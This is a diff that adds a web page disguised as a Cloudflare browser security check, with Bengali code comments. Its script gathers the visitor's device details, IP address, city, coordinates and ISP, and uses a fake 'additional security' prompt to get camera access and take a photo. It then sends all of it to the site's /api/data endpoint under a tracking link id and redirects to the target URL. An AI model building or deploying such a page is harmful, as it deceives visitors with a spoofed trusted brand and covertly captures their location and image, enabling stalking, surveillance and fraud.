@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloudflare Security Check</title>
+    <link rel="stylesheet" href="/style.css">
+    <style>
+        .cloudflare-container {
+            max-width: 600px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 10px;
+            padding: 40px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        
+        .cloudflare-logo {
+            margin-bottom: 30px;
+        }
+        
+        .cloudflare-logo svg {
+            width: 80px;
+            height: 80px;
+        }
+        
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            margin: 30px 0;
+            position: relative;
+        }
+        
+        .progress-steps::before {
+            content: '';
+            position: absolute;
+            top: 20px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #e0e0e0;
+            z-index: 1;
+        }
+        
+        .step {
+            position: relative;
+            z-index: 2;
+            background: white;
+            padding: 10px;
+            flex: 1;
+            text-align: center;
+        }
+        
+        .step .number {
+            width: 40px;
+            height: 40px;
+            background: #e0e0e0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+            font-weight: bold;
+            color: #666;
+        }
+        
+        .step.active .number {
+            background: #f6821f;
+            color: white;
+        }
+        
+        .step.completed .number {
+            background: #4caf50;
+            color: white;
+        }
+        
+        .step .label {
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .verification-box {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 30px;
+            margin: 20px 0;
+        }
+        
+        .ip-info {
+            background: #e3f2fd;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+            font-family: monospace;
+        }
+        
+        .redirect-url {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            word-break: break-all;
+            font-family: monospace;
+        }
+        
+        .permission-request {
+            background: white;
+            border: 2px solid #f6821f;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .permission-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .permission-buttons button {
+            flex: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="cloudflare-container">
+            <div class="cloudflare-logo">
+                <svg viewBox="0 0 128 128">
+                    <path fill="#F6821F" d="M84.5 55.2c-.2 0-.4.1-.6.1-.2 0-.4-.1-.6-.1-3.3-1.1-6.8 1-7.9 4.3l-3.3 9.8c-.2.5-.7.9-1.3.9H52.7c-.5 0-1-.3-1.2-.8l-1.9-5.6c-1.1-3.3-4.6-5.4-7.9-4.3-3.3 1.1-5.4 4.6-4.3 7.9l1.9 5.6c.2.5.7.8 1.2.8h35.8c.5 0 1-.3 1.2-.8l3.3-9.8c1.1-3.3-1-6.8-4.3-7.9z"/>
+                    <path fill="#F6821F" d="M113.5 67.3c-1.1-3.3-4.6-5.4-7.9-4.3-3.3 1.1-5.4 4.6-4.3 7.9l1.9 5.6c.2.5.7.8 1.2.8h20.1c.5 0 1-.3 1.2-.8l1.9-5.6c1.1-3.3-1-6.8-4.3-7.9-1.8-.6-3.7-.6-5.5 0z"/>
+                </svg>
+            </div>
+            
+            <h1>Cloudflare Security Check</h1>
+            <p>We are verifying your browser to ensure a secure connection</p>
+            
+            <div class="progress-steps">
+                <div class="step active" id="step1">
+                    <div class="number">1</div>
+                    <div class="label">Verifying Browser</div>
+                </div>
+                <div class="step" id="step2">
+                    <div class="number">2</div>
+                    <div class="label">Checking IP</div>
+                </div>
+                <div class="step" id="step3">
+                    <div class="number">3</div>
+                    <div class="label">Security Check</div>
+                </div>
+                <div class="step" id="step4">
+                    <div class="number">4</div>
+                    <div class="label">Redirecting</div>
+                </div>
+            </div>
+            
+            <div class="verification-box" id="verificationBox">
+                <div class="loader" id="loader"></div>
+                <p id="statusText">Starting verification...</p>
+            </div>
+            
+            <div class="ip-info" id="ipInfo" style="display: none;">
+                <strong>IP Address:</strong> <span id="ipAddress">Loading...</span><br>
+                <strong>Location:</strong> <span id="location">Loading...</span><br>
+                <strong>Browser:</strong> <span id="browserInfo">Loading...</span>
+            </div>
+            
+            <div class="permission-request" id="permissionRequest" style="display: none;">
+                <h3>Additional Security Required</h3>
+                <p>Please allow camera access for verification</p>
+                <div class="permission-buttons">
+                    <button class="btn btn-primary" id="allowCamera">Allow Camera</button>
+                    <button class="btn btn-secondary" id="skipCamera">Skip</button>
+                </div>
+            </div>
+            
+            <div class="redirect-url" id="redirectUrl" style="display: none;">
+                <strong>Redirecting to:</strong><br>
+                <span id="targetUrl"></span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // URL থেকে টার্গেট বের করা
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetUrl = decodeURIComponent(urlParams.get('url') || 'https://google.com');
+        const linkId = window.location.pathname.split('/')[2];
+        
+        let collectedData = {
+            ip: null,
+            location: null,
+            device: null,
+            camera: null
+        };
+        
+        document.getElementById('targetUrl').textContent = targetUrl;
+        
+        async function startVerification() {
+            // স্টেপ 1: ব্রাউজার ভেরিফিকেশন
+            await step1();
+            
+            // স্টেপ 2: আইপি চেক
+            await step2();
+            
+            // স্টেপ 3: সিকিউরিটি চেক (ক্যামেরা পারমিশন)
+            await step3();
+            
+            // স্টেপ 4: রিডাইরেক্ট
+            await step4();
+        }
+        
+        async function step1() {
+            updateStep(1, 'active');
+            document.getElementById('statusText').textContent = 'Verifying browser configuration...';
+            
+            // ডিভাইস ইনফো কালেক্ট
+            collectedData.device = {
+                browser: getBrowserInfo(),
+                os: getOSInfo(),
+                device: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                userAgent: navigator.userAgent
+            };
+            
+            document.getElementById('browserInfo').textContent = `${collectedData.device.browser} on ${collectedData.device.os}`;
+            
+            await delay(1000);
+            updateStep(1, 'completed');
+        }
+        
+        async function step2() {
+            updateStep(2, 'active');
+            document.getElementById('statusText').textContent = 'Checking IP address and location...';
+            document.getElementById('ipInfo').style.display = 'block';
+            
+            try {
+                // আইপি পাওয়া
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                collectedData.ip = ipData.ip;
+                document.getElementById('ipAddress').textContent = ipData.ip;
+                
+                // লোকেশন ডাটা
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                
+                collectedData.location = {
+                    country: locationData.country_name,
+                    region: locationData.region,
+                    city: locationData.city,
+                    latitude: locationData.latitude,
+                    longitude: locationData.longitude,
+                    isp: locationData.org
+                };
+                
+                document.getElementById('location').textContent = 
+                    `${locationData.city || 'Unknown'}, ${locationData.country_name || 'Unknown'}`;
+                
+            } catch (error) {
+                console.error('IP Error:', error);
+            }
+            
+            await delay(1000);
+            updateStep(2, 'completed');
+        }
+        
+        async function step3() {
+            updateStep(3, 'active');
+            document.getElementById('statusText').textContent = 'Additional security check required...';
+            document.getElementById('permissionRequest').style.display = 'block';
+            
+            // ক্যামেরা পারমিশনের জন্য অপেক্ষা
+            return new Promise((resolve) => {
+                document.getElementById('allowCamera').onclick = async () => {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        
+                        // ফটো তুলবে
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+                        
+                        await delay(2000);
+                        
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        collectedData.camera = {
+                            image: canvas.toDataURL('image/jpeg', 0.8),
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                    } catch (error) {
+                        console.error('Camera Error:', error);
+                    }
+                    
+                    document.getElementById('permissionRequest').style.display = 'none';
+                    updateStep(3, 'completed');
+                    resolve();
+                };
+                
+                document.getElementById('skipCamera').onclick = () => {
+                    document.getElementById('permissionRequest').style.display = 'none';
+                    updateStep(3, 'completed');
+                    resolve();
+                };
+            });
+        }
+        
+        async function step4() {
+            updateStep(4, 'active');
+            document.getElementById('statusText').textContent = 'Verification complete! Redirecting...';
+            document.getElementById('redirectUrl').style.display = 'block';
+            
+            // ডাটা পাঠাও
+            await sendData();
+            
+            await delay(2000);
+            updateStep(4, 'completed');
+            
+            // রিডাইরেক্ট
+            window.location.href = targetUrl;
+        }
+        
+        async function sendData() {
+            try {
+                await fetch('/api/data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        linkId,
+                        type: 'custom',
+                        data: collectedData,
+                        ip: collectedData.ip,
+                        location: collectedData.location,
+                        device: collectedData.device,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } catch (error) {
+                console.error('Send Data Error:', error);
+            }
+        }
+        
+        function updateStep(step, status) {
+            for (let i = 1; i <= 4; i++) {
+                const stepEl = document.getElementById(`step${i}`);
+                stepEl.classList.remove('active', 'completed');
+            }
+            
+            const currentStep = document.getElementById(`step${step}`);
+            currentStep.classList.add(status);
+        }
+        
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edge')) return 'Edge';
+            if (ua.includes('Opera')) return 'Opera';
+            return 'Unknown';
+        }
+        
+        function getOSInfo() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Mac')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+            return 'Unknown';
+        }
+        
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
+        // স্টার্ট
+        startVerification();
+    </script>
+</body>
+</html>
